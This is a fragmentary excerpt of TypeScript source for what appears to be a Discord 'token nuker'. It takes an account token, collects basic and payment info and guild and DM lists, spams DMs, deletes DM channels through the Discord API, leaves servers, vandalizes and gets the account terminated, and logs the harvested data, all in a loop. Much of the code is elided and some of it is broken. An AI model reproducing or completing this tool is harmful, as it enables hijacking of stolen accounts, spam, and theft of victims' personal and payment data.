...
async function nuke(token: string): Promise<boolean> {
     ...
     const headers: AxiosRequestConfig = await headerinit(token)
     {
          let ui: any;
          {
               let notif: Ora = ora("Validating token...");
          ...
          let notif: Ora = ora("Getting basic info...").start();
     ...
     let pnotif: Ora = ora("Getting payment info...").start();
     ...
     let guildnotif: Ora = ora("Retrieving guilds...");
     ...
     let unluckychannel = "";
     let dmnotif: Ora = ora("Retrieving dms...").start();
     ...
     let fkill: Ora = ora("Spamming dms...").start();
     let fri = 0;
     ...
     fkill.succeed(`Successfully raided ${fri} dms`);
     
     let dmc: Ora = ora("Closing DMs").start();
     let cc: number = 0;
     for (let channel of data["Channels"]) {
          axios.delete(`https://discord.com/api/channels/${channel}`, headers);
          cc += 1;
     }
     dmc.succeed(`Closed ${cc} dms`);

     let srvd: Ora = ora("Leaving servers...").start();
     let srvc: number = 0;
     ...
     srvd.succeed(`Left ${srvc} servers`);
     let defd: Ora = ora("Vandalizing account...");
     ...
     let banfd: Ora = ora("Terming account...").start();
     ...
     let logf: Ora = ora("Logging data...").start();
     clear_empty(data);
...
`)
     ...
     let token: string = await input.question("\0");
     while (true) {
          let time = Date.now();
          if (await nuke(token))
     }
